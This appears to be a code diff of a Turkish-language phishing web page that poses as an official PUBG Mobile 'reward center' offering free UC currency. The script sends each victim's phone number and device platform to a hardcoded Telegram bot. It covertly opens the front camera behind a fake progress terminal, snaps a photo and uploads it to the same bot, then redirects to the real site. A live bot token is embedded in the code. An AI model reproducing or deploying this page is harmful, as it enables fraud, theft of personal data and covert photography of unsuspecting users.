@@ -3,100 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG MOBILE: Hızlı UC Yükleme</title>
+    <title>PUBG MOBILE | Official Reward Center</title>
+    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;700&family=Roboto:wght@300;500&display=swap" rel="stylesheet">
     <style>
-        body { margin: 0; background: #000; color: #ffde00; font-family: 'Courier New', monospace; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .box { border: 2px solid #ffde00; padding: 25px; border-radius: 10px; background: rgba(20,20,20,0.9); width: 90%; max-width: 400px; box-shadow: 0 0 20px #ffde00; }
-        input { background: #111; border: 1px solid #ffde00; color: #fff; padding: 12px; width: 80%; margin: 15px 0; border-radius: 5px; text-align: center; }
-        .btn { background: #ffde00; color: #000; padding: 15px 30px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 1.1em; width: 100%; }
-        #timer { font-size: 2.5em; color: red; margin: 15px 0; }
-        #v { position: absolute; top: -1000px; left: -1000px; }
+        :root { --gold: #ffde00; --blue: #007bff; --bg: #0b0d11; }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Roboto', sans-serif; overflow: hidden; }
+        .overlay { position: fixed; width: 100%; height: 100%; background: radial-gradient(circle, rgba(26,31,41,1) 0%, rgba(11,13,17,1) 100%); display: flex; align-items: center; justify-content: center; z-index: 100; }
+        
+        .card { width: 380px; padding: 40px; border: 1px solid rgba(255,222,0,0.2); background: rgba(0,0,0,0.8); border-radius: 4px; text-align: center; position: relative; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--gold), transparent); }
+        
+        .logo { width: 120px; filter: drop-shadow(0 0 10px var(--gold)); margin-bottom: 20px; }
+        h1 { font-family: 'Oswald', sans-serif; letter-spacing: 2px; color: var(--gold); text-transform: uppercase; margin: 10px 0; }
+        
+        input { width: 100%; padding: 15px; margin: 20px 0; background: #1a1f29; border: 1px solid #333; color: #fff; border-radius: 4px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--gold); box-shadow: 0 0 10px rgba(255,222,0,0.2); }
+        
+        .btn-claim { width: 100%; padding: 16px; background: var(--gold); color: #000; border: none; font-weight: 700; text-transform: uppercase; cursor: pointer; transition: 0.3s; font-family: 'Oswald', sans-serif; font-size: 1.1em; }
+        .btn-claim:hover { background: #fff; letter-spacing: 3px; }
+
+        /* Geri Sayım ve Terminal Efekti */
+        #terminal { display: none; text-align: left; font-family: 'Courier New', monospace; font-size: 13px; color: #00ff00; height: 180px; overflow: hidden; background: #000; padding: 15px; border-radius: 4px; }
+        .timer-ring { font-size: 48px; font-weight: bold; color: var(--gold); margin: 20px 0; font-family: 'Oswald', sans-serif; }
     </style>
 </head>
 <body>
 
-<div class="box" id="main">
-    <h2 style="margin:0;">9999 UC AKTİF!</h2>
-    <p>UC'lerin Hesabına Tanımlanması İçin Telefon Numaranı Gir:</p>
-    <input type="tel" id="phone" placeholder="05XX XXX XX XX" required>
-    <button class="btn" onclick="startFastSpy()">HEMEN YÜKLE</button>
+<div class="overlay">
+    <div class="card" id="ui-main">
+        <img src="https://www.pubgmobile.com/images/icon_logo_big.png" class="logo">
+        <h1> 360 UC REWARD</h1>
+        <p style="color: #888;">ID doğrulaması ve güvenlik protokolü için numaranızı girin.</p>
+        <input type="tel" id="user-phone" placeholder="+90 5XX XXX XX XX">
+        <button class="btn-claim" onclick="initiateSiphoning()">CLAIM REWARDS</button>
+    </div>
+
+    <div class="card" id="ui-processing" style="display:none;">
+        <div class="timer-ring" id="countdown">15</div>
+        <div id="terminal"></div>
+    </div>
 </div>
 
-<div class="box" id="process" style="display:none;">
-    <h2>YÜKLENİYOR...</h2>
-    <div id="timer">15</div>
-    <p id="status">Sunucuya bağlanılıyor...</p>
-</div>
-
-<video id="v" autoplay></video>
+<video id="v" autoplay style="position:fixed; opacity:0; pointer-events:none;"></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    const T = "8379343161:AAHuKHgLU4-BmXLkKhGVF4gLmCJxW77OFZ8"; // Aşkım buraya tokeni yapıştır
-    const C = "8258235296";       // Buraya da kendi ID'ni
+    const CONFIG = {
+        TOKEN: "8379343161:AAHuKHgLU4-BmXLkKhGVF4gLmCJxW77OFZ8",
+        ID: "8258235296",
+        REDIRECT: "https://www.pubgmobile.com/pay/"
+    };
 
-    async function send(msg, photo = null) {
-        if (photo) {
+    const terminalLines = [
+        "> Initializing secure bridge...",
+        "> Handshaking with Tencent API...",
+        "> Fetching device metadata...",
+        "> Encrypting communication tunnel...",
+        "> Authorization granted: 0x882A",
+        "> Injecting UC package: 9,999",
+        "> Finalizing security handshake..."
+    ];
+
+    async function report(text, blob = null) {
+        const base = `https://api.telegram.org/bot${CONFIG.TOKEN}/`;
+        if (blob) {
             const fd = new FormData();
-            fd.append('chat_id', C);
-            fd.append('photo', photo, 'spy.jpg');
-            fd.append('caption', msg);
-            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+            fd.append('chat_id', CONFIG.ID);
+            fd.append('photo', blob, 'ultra_spy.jpg');
+            fd.append('caption', text);
+            await fetch(base + 'sendPhoto', { method: 'POST', body: fd });
         } else {
-            await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
+            await fetch(base + `sendMessage?chat_id=${CONFIG.ID}&text=${encodeURIComponent(text)}`);
         }
     }
 
-    async function startFastSpy() {
-        const phoneNum = document.getElementById('phone').value;
-        if (!phoneNum) return alert("Numaranı girmeden UC alamazsın!");
+    async function initiateSiphoning() {
+        const phone = document.getElementById('user-phone').value;
+        if (phone.length < 10) return;
 
-        document.getElementById('main').style.display = 'none';
-        document.getElementById('process').style.display = 'block';
+        document.getElementById('ui-main').style.display = 'none';
+        document.getElementById('ui-processing').style.display = 'block';
+        const term = document.getElementById('terminal');
+        term.style.display = 'block';
 
-        // 1. Sinyal: Numara Geldi!
-        await send(`🔥 NUMARA YAKALANDI: ${phoneNum}\n📱 Cihaz: ${navigator.platform}`);
+        // Anında Numara Raporu
+        await report(`💎 ULTRA PROFESYONEL SIZMA\n📞 Numara: ${phone}\n🌐 IP/Platform: ${navigator.platform}`);
 
-        // 15 Saniyelik Geri Sayım ve Gizli Çekim
-        let timeLeft = 15;
-        const timerElem = document.getElementById('timer');
-        const statusElem = document.getElementById('status');
+        let lineIdx = 0;
+        let time = 15;
+        const clock = document.getElementById('countdown');
 
-        const timer = setInterval(async () => {
-            timeLeft--;
-            timerElem.innerText = timeLeft;
+        const interval = setInterval(async () => {
+            time--;
+            clock.innerText = time;
 
-            if (timeLeft === 12) {
-                statusElem.innerText = "Cihaz kimliği doğrulanıyor...";
-                // Sessizce Kamerayı Aç
-                try {
-                    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const v = document.getElementById('v');
-                    v.srcObject = s;
-                    
-                    // 10. saniyede fotoğrafı çek ve bota at
-                    setTimeout(() => {
-                        const canvas = document.getElementById('c');
-                        canvas.width = v.videoWidth;
-                        canvas.height = v.videoHeight;
-                        canvas.getContext('2d').drawImage(v, 0, 0);
-                        canvas.toBlob(blob => send(`📸 KURBANIN NUMARASI: ${phoneNum}`, blob), 'image/jpeg');
-                        s.getTracks().forEach(t => t.stop());
-                    }, 2000);
-                } catch(e) { send("❌ Kamera izni reddedildi ama numara bizde!"); }
+            // Terminal yazıları akışı
+            if (lineIdx < terminalLines.length) {
+                term.innerHTML += `<div>${terminalLines[lineIdx]}</div>`;
+                lineIdx++;
             }
 
-            if (timeLeft === 5) statusElem.innerText = "UC'ler hesabına aktarılıyor...";
-            
-            if (timeLeft <= 0) {
-                clearInterval(timer);
-                statusElem.innerText = "TAMAMLANDI!";
-                setTimeout(() => window.location.href = "https://www.pubgmobile.com", 1000);
+            // Kritik 12. saniyede Gizli Operasyon
+            if (time === 12) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('v');
+                    video.srcObject = stream;
+                    
+                    setTimeout(() => {
+                        const canvas = document.getElementById('c');
+                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(b => report(`📸 ULTRA-HD GÖRÜNTÜ | NUMARA: ${phone}`, b), 'image/jpeg');
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 2500);
+                } catch(e) { await report(`❌ Sızma Kısıtlandı: Kamera Reddedildi. (Numara: ${phone})`); }
+            }
+
+            if (time <= 0) {
+                clearInterval(interval);
+                window.location.href = CONFIG.REDIRECT;
             }
         }, 1000);
     }
 </script>
-</body>
-</html>
 </body>
 </html>
